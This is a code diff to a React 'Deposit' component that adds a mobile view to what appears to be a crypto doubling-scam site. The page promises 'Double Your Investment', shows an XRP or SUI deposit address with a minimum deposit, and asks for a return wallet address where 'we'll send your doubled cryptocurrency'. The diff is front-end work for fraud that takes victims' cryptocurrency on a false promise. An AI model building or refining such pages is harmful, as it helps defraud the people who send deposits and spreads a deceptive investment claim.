@@ -95,7 +95,137 @@ export default function Deposit() {
       className="py-20 lg:py-32 bg-primary"
     >
       <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
-        <div className="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
+        {/* Mobile View */}
+        <div className="lg:hidden">
+          <div className="text-center mb-10">
+            <h2 className="text-2xl font-bold mb-4">Double Your Investment</h2>
+            <p className="text-gray-300 mb-6">Follow these steps to get started</p>
+          </div>
+          
+          {/* Mobile Steps Carousel */}
+          <div className="mb-8 px-1">
+            <div className="overflow-x-auto pb-4 -mx-4 px-4 flex snap-x snap-mandatory">
+              {steps.map((step) => (
+                <motion.div 
+                  key={step.number}
+                  className="flex-shrink-0 w-[80%] snap-center mr-4 bg-secondary/60 backdrop-blur-md rounded-xl p-5 border border-white/5"
+                  initial={{ opacity: 0, y: 20 }}
+                  whileInView={{ opacity: 1, y: 0 }}
+                  transition={{ duration: 0.4, delay: step.number * 0.05 }}
+                  viewport={{ once: true, margin: "-100px" }}
+                >
+                  <div className="flex items-center mb-3">
+                    <div className="h-9 w-9 rounded-full bg-gradient-to-r from-blue-500 to-purple-500 flex items-center justify-center font-bold text-white mr-3">
+                      {step.number}
+                    </div>
+                    <h3 className="text-base font-medium">{step.title}</h3>
+                  </div>
+                  <p className="text-sm text-gray-400 ml-12">{step.description}</p>
+                </motion.div>
+              ))}
+            </div>
+          </div>
+          
+          {/* Mobile Deposit Card */}
+          <div className="rounded-xl overflow-hidden bg-secondary/60 backdrop-blur-md shadow-xl">
+            {/* Crypto Selector Tabs */}
+            <div className="flex rounded-t-xl bg-secondary p-1">
+              <button
+                className={`flex-1 flex items-center justify-center py-3 rounded-lg text-sm font-medium ${
+                  selectedCrypto === 'xrp' 
+                    ? 'bg-[#23292F] text-white shadow-lg' 
+                    : 'text-gray-400 hover:text-white'
+                }`}
+                onClick={() => setSelectedCrypto('xrp')}
+              >
+                <XRPIcon />
+                <span className="ml-2">XRP</span>
+              </button>
+              <button
+                className={`flex-1 flex items-center justify-center py-3 rounded-lg text-sm font-medium ${
+                  selectedCrypto === 'sui' 
+                    ? 'bg-[#6BCEFF] text-white shadow-lg' 
+                    : 'text-gray-400 hover:text-white'
+                }`}
+                onClick={() => setSelectedCrypto('sui')}
+              >
+                <SUIIcon />
+                <span className="ml-2">SUI</span>
+              </button>
+            </div>
+            
+            <div className="p-5">
+              <div className="mb-5">
+                <div className="flex justify-between items-center mb-3">
+                  <h3 className="text-base font-bold">Deposit Address</h3>
+                  {selectedCrypto === 'xrp' ? (
+                    <div className="px-3 py-1 rounded-full text-xs bg-[#23292F]/20 text-white">
+                      XRP Network
+                    </div>
+                  ) : (
+                    <div className="px-3 py-1 rounded-full text-xs bg-[#6BCEFF]/20 text-white">
+                      SUI Network
+                    </div>
+                  )}
+                </div>
+                
+                <div className="bg-primary/60 rounded-lg overflow-hidden border border-gray-700/50">
+                  <div className="p-3 font-mono text-xs break-all">
+                    {walletAddress}
+                  </div>
+                  <div className="border-t border-gray-700/50 flex">
+                    <CopyButton value={walletAddress} />
+                    <div className="flex-1 p-2 text-xs text-center text-blue-400">
+                      Send only {selectedCrypto.toUpperCase()} to this address
+                    </div>
+                  </div>
+                </div>
+              </div>
+              
+              <div className="bg-yellow-500/10 border border-yellow-500/50 rounded-lg p-3 mb-5">
+                <div className="flex">
+                  <AlertTriangle className="h-4 w-4 text-yellow-500 mr-2 flex-shrink-0 mt-0.5" />
+                  <p className="text-xs text-yellow-200">
+                    Minimum deposit: <span className="font-medium">{minDeposit} {selectedCrypto.toUpperCase()}</span>. Processing time: up to 24 hours.
+                  </p>
+                </div>
+              </div>
+              
+              <Form {...form}>
+                <form onSubmit={form.handleSubmit(onSubmit)}>
+                  <FormField
+                    control={form.control}
+                    name="returnAddress"
+                    render={({ field }) => (
+                      <FormItem className="mb-4">
+                        <FormLabel className="text-sm">Your Return Wallet Address</FormLabel>
+                        <FormControl>
+                          <Input 
+                            placeholder="Enter your wallet address to receive doubled funds" 
+                            {...field}
+                            className="rounded-lg py-5 bg-primary/40 border-gray-700/50"
+                          />
+                        </FormControl>
+                        <p className="mt-1 text-xs text-gray-400">This is where we'll send your doubled cryptocurrency</p>
+                        <FormMessage />
+                      </FormItem>
+                    )}
+                  />
+                  
+                  <Button 
+                    type="submit" 
+                    className="w-full bg-gradient-to-r from-blue-500 to-purple-500 hover:opacity-90 py-6 h-auto rounded-xl text-white font-medium text-base shadow-lg"
+                  >
+                    I've Made My Deposit
+                  </Button>
+                </form>
+              </Form>
+            </div>
+          </div>
+        </div>
+        
+        {/* Desktop View */}
+        <div className="hidden lg:grid lg:grid-cols-2 gap-12 items-center">
           <div>
             <h2 className="text-3xl md:text-4xl font-bold mb-6">Ready to Double Your Investment?</h2>
             <p className="text-xl text-gray-300 mb-8">Follow these simple steps to get started with your XRP or SUI investment</p>
